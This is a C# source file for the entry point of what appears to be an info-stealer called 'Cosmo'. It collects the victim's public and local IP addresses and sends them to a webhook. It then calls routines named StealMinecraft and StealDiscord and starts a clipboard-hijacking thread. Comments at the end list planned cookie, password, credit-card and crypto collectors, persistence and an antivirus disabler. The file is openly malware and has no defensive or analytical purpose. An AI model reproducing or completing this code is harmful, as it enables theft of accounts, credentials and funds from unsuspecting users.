namespace Cosmo.Program
{
    class Program
    {
        static async Task Main(string[] args)
        {
            String ip = await Utils.Utils.GetIPAsync();
            List<String> ipsList = Utils.Utils.GetLocalIPs();
            String ips = String.Join("   |   ", ipsList);
            String gatewayIP = Utils.Utils.GetNetworkGatewayIP();
            //List<String> networkIPList = Utils.Utils.GetNetworkIPs(gatewayIP);
            //String networkIPs = String.Join("\n", networkIPList);

            // Boolean taskMan = Utils.Utils.DisableTaskMan();

            Utils.Utils.FireWebhook("The Cosmos have detected a new instance : " + Global.Global.guid);
            Utils.Utils.FireWebhook("Public IP : " + ip);
            Utils.Utils.FireWebhook("Local IP(s) :    |   " + ips + "   |");
            //FireWebhook("Network IP(s) : \n" + networkIPs);
            Utils.Utils.StealMinecraft();
            Utils.Utils.StealDiscord();
            // if (taskMan) { FireWebhook("Task manager successfully disabled"); } else { FireWebhook("Failed to disable task manager"); }

            Thread clipperThread = Clipper.Clipper.ClipboardThread();

            clipperThread.SetApartmentState(ApartmentState.STA);
            clipperThread.Start();
        }
    }   
}

// Cookie collector
// Bookmark collector
// History collector
// Password collector
// CC collector

// Crypto Collector

// Persistence
// AV disabler

// Kill switch thread
